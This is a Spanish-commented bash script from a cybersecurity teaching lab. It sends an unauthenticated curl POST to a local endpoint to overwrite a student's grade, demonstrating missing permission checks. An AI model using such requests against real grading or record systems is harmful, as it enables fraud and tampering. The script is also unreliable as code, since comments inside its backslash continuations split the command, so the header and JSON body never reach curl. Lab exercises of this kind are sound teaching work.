#!/bin/bash

# LABORATORIO DE CIBERSEGURIDAD - CFP20 AMDELCO
# Objetivo: demostrar cómo una petición HTTP puede modificar
# una calificación en un servidor que no controla los permisos.

# Mostramos un mensaje informativo en la terminal.
echo "Modificando la nota del alumno..."

# curl permite comunicarnos con un servidor mediante HTTP.
# -i muestra las cabeceras de la respuesta y el contenido.
# -X POST indica que enviamos una petición HTTP de tipo POST.
# La URL identifica el endpoint que permite modificar la nota.
curl -i -X POST http://127.0.0.1:5000/api/nota \

  # -H agrega una cabecera HTTP.
  # Content-Type indica que enviamos datos en formato JSON.
  -H "Content-Type: application/json" \

  # -d indica los datos que enviamos en el cuerpo de la petición.
  # "nota" es la clave del JSON y 10 es el nuevo valor.
  -d '{"nota": 10}'
